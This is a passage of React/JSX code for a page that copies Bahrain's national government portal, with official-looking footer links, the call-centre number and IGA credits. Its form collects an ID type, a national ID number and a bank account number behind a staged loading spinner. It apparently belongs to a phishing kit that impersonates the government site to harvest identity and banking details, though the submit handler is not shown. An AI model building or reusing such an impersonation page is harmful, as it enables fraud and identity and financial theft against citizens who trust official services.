            <svg width="14" height="14" viewBox="0 0 24 24" fill="white"><path d="M7 14l5-5 5 5z"/></svg>
          </div>

          {/* Form area */}
          <div className="bh-form-area">
            <div className="bh-form-row">
              <label className="bh-form-label">
                <span className="required">*</span> {t('id_type')}
              </label>
              <select
                className="bh-form-select"
                value={idType}
                onChange={e => {
                  const val = e.target.value;
                  setIdType(val);
                  setIdNumber("");
                  setAccountNumber("");
                  setShowFormFields(false);
                  if (val) {
                    setIsLoadingForm(true);
                    setTimeout(() => {
                      setIsLoadingForm(false);
                      setShowFormFields(true);
                    }, 2000);
                  } else {
                    setIsLoadingForm(false);
                    setShowFormFields(false);
                  }
                }}
              >
                <option value="">{t('select_id_type')}</option>
                <option value="emirati">{t('emirati_id')}</option>
                <option value="bahraini">{t('bahraini_id')}</option>
                <option value="saudi">{t('saudi_id')}</option>
                <option value="omani">{t('omani_id')}</option>
                <option value="qatari">{t('qatari_id')}</option>
                <option value="kuwaiti">{t('kuwaiti_id')}</option>
                <option value="owners_union">{t('owners_union')}</option>
                <option value="gov_entity">{t('gov_entity')}</option>
                <option value="passport">{t('passport')}</option>
                <option value="commercial_reg">{t('commercial_reg')}</option>
                <option value="establishment">{t('establishment')}  </option>
              </select>
            </div>

            {isLoadingForm && (
              <div className="bh-loading-overlay">
                <div className="bh-dots-spinner">
                  <div className="bh-dot"></div>
                  <div className="bh-dot"></div>
                  <div className="bh-dot"></div>
                  <div className="bh-dot"></div>
                  <div className="bh-dot"></div>
                  <div className="bh-dot"></div>
                  <div className="bh-dot"></div>
                  <div className="bh-dot"></div>
                </div>
              </div>
            )}

            {showFormFields && !isLoadingForm && (
              <>
                <div className="bh-form-row">
                  <label className="bh-form-label">
                    <span className="required">*</span> {t('id_number')}
                  </label>
                  <input
                    className="bh-form-input"
                    type="text"
                    value={idNumber}
                    onChange={e => setIdNumber(e.target.value.replace(/[^0-9]/g, ''))}
                    placeholder=""
                    maxLength={12}
                  />
                </div>
                <div className="bh-form-row">
                  <label className="bh-form-label">
                    <span className="required">*</span> {t('account_number')}
                  </label>
                  <input
                    className="bh-form-input"
                    type="text"
                    value={accountNumber}
                    onChange={e => setAccountNumber(e.target.value.replace(/[^0-9]/g, ''))}
                    placeholder=""
                    maxLength={15}
                  />
                </div>
              </>
            )}
          </div>

          {/* Buttons */}
          <div className="bh-buttons">
            {showFormFields && !isLoadingForm && (
              <>
                <button
                  className="bh-btn-primary"
                  onClick={handleSubmit}
                  disabled={isSubmitting || !idNumber || !accountNumber}
                >
                  {isSubmitting ? t('loading') : t('submit')}
                </button>
                <button
                  className="bh-btn-primary"
                  onClick={() => { setIdNumber(""); setAccountNumber(""); }}
                >
                  {lang === 'ar' ? 'مسح' : 'Clear'}
                </button>
              </>
            )}
            <button className="bh-btn-back" onClick={() => { setIdType(""); setIdNumber(""); setAccountNumber(""); setShowFormFields(false); }}>{t('back')}</button>
          </div>
        </div>

        {/* Bottom line */}
        <div className="bh-bottom-line"></div>

        {/* ===== FOOTER ===== */}
        {/* Footer Links Section */}
        <div className="bh-footer-links">
          <div className="bh-container">
            <div className="bh-footer-columns">
              {/* Column 1: دليل المعلومات */}
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">{t('information_guide')}</div>
                <ul>
                  <li><a>{lang === 'ar' ? 'هنا في البحرين' : 'Here in Bahrain'}</a></li>
                  <li><a>{t('about_bahrain_link')}</a></li>
                  <li><a>{t('discover_bahrain')}</a></li>
                  <li><a>{t('gov_services_guide')}</a></li>
                  <li><a>{t('gov_guide')}</a></li>
                  <li><a>{t('ai_bahrain')}</a></li>
                  <li><a>{t('customer_service_guide')}</a></li>
                  <li><a>{lang === 'ar' ? 'أرقام الطوارئ' : 'Emergency Numbers'}</a></li>
                </ul>
              </div>
              {/* Column 2: الخدمات الإلكترونية */}
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">{t('electronic_services')}</div>
                <ul>
                  <li><a>{lang === 'ar' ? 'تصنيف الخدمات الإلكترونية' : 'eServices Classification'}</a></li>
                  <li><a>{lang === 'ar' ? 'مقدمو الخدمات الإلكترونية' : 'eServices Providers'}</a></li>
                  <li><a>{lang === 'ar' ? 'متجر تطبيقات الهواتف' : 'Mobile Apps Store'}</a></li>
                  <li><a>{lang === 'ar' ? 'دليل المستخدم' : 'User Guide'}</a></li>
                  <li><a>{lang === 'ar' ? 'المفتاح الإلكتروني 2.0 المطوّر' : 'eKey 2.0'}</a></li>
                  <li><a>{lang === 'ar' ? 'مواقع مراكز خدمة العملاء وأجهزة الخدمة الذاتية' : 'Service Center Locations & Self-Service Kiosks'}</a></li>
                </ul>
              </div>
              {/* Column 3: روابط سريعة */}
              <div className="bh-footer-col">
                <div className="bh-footer-col-title">{lang === 'ar' ? 'روابط سريعة' : 'Quick Links'}</div>
                <ul>
                  <li><a>{lang === 'ar' ? 'حول البوابة الوطنية' : 'About the National Portal'}</a></li>
                  <li><a>{lang === 'ar' ? 'إحصائيات قنوات الخدمة' : 'Service Channel Statistics'}</a></li>
                  <li><a>{lang === 'ar' ? 'المشاركة الإلكترونية "شاركنا"' : 'eParticipation'}</a></li>
                  <li><a>{lang === 'ar' ? 'الأخبار الحكومية' : 'Government News'}</a></li>
                  <li><a>{lang === 'ar' ? 'أخبار البحرين' : 'Bahrain News'}</a></li>
                  <li><a>{lang === 'ar' ? 'تقويم البحرين' : 'Bahrain Calendar'}</a></li>
                  <li><a>{lang === 'ar' ? 'فعاليات تقنية المعلومات' : 'IT Events'}</a></li>
                  <li><a>{lang === 'ar' ? 'الإشادات والجوائز' : 'Awards & Recognition'}</a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>

        {/* Footer Social Media & Contact */}
        <div className="bh-footer-social">
          <div className="bh-container">
            <div className="bh-footer-social-inner">
              <img src="/bahrain_2030.png" alt="البحرين 2030" style={{ height: '160px', objectFit: 'contain' }} />
              <div className="bh-footer-social-right" style={{ flexDirection: 'column', alignItems: 'flex-start', gap: '12px' }}>
                <span className="bh-footer-contact-title">{t('follow_us')}</span>
                <div className="bh-footer-social-icons">
                  <a title="LinkedIn">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/></svg>
                  </a>
                  <a title="Instagram">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
                  </a>
                  <a title="X">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                  </a>
                  <a title="Facebook">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"/></svg>
                  </a>
                  <a title="YouTube">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/></svg>
                  </a>
                </div>
              </div>
              <div className="bh-footer-social-left">
                <div className="bh-footer-contact-title">{t('contact_us')}</div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
                  <img src="/tawasul-logo.png" alt="تواصل" style={{ height: '55px', objectFit: 'contain' }} />
                  <div>
                    <div className="bh-footer-contact-number">80008001</div>
                    <div className="bh-footer-contact-sub">{lang === 'ar' ? 'مركز اتصال الخدمات الحكومية' : 'Government Services Call Center'}</div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer Bottom Links */}
        <div className="bh-footer-bottom-links">
          <div className="bh-container">
            <a>{t('terms_of_use')}</a>
            <span className="separator">|</span>
            <a>{t('privacy_policy')}</a>
            <span className="separator">|</span>
            <a>{t('accessibility')}</a>
            <span className="separator">|</span>
            <a>{t('faq')}</a>
            <span className="separator">|</span>
            <a>{t('help')}</a>
            <span className="separator">|</span>
            <a>{t('contact_link')}</a>
            <span className="separator">|</span>
            <a>{t('sitemap')}</a>
          </div>
        </div>

        {/* Footer Copyright */}
        <div className="bh-footer-copyright">
          <div className="bh-container">
            <p>{t('last_update')} {lang === 'ar' ? 'السبت، 7 مارس 2026' : 'Saturday, March 7, 2026'}</p>
            <p>{t('developed_by')} <a>{t('iga')}</a></p>
            <p>{t('copyright')} 2026 {t('kingdom_of_bahrain')}</p>
            <p>{t('all_rights_reserved')}</p>
          </div>
        </div>
      </div>
    </>
  );
}
